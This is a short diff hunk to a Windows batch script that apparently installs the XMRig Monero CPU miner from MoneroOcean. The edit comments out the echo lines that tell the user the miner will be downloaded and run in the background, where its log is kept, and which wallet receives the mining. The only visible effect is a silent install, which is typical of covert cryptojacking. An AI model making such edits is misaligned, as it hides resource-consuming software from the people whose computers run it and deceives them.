@@ -164,9 +164,9 @@ rem printing intentions
 
 set "LOGFILE=%USERPROFILE%\moneroocean\xmrig.log"
 
-echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
-echo If needed, miner in foreground can be started by %USERPROFILE%\moneroocean\miner.bat script.
-echo Mining will happen to %WALLET% wallet.
+rem echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
+rem echo If needed, miner in foreground can be started by %USERPROFILE%\moneroocean\miner.bat script.
+rem echo Mining will happen to %WALLET% wallet.
 
 if not [%EMAIL%] == [] (
 
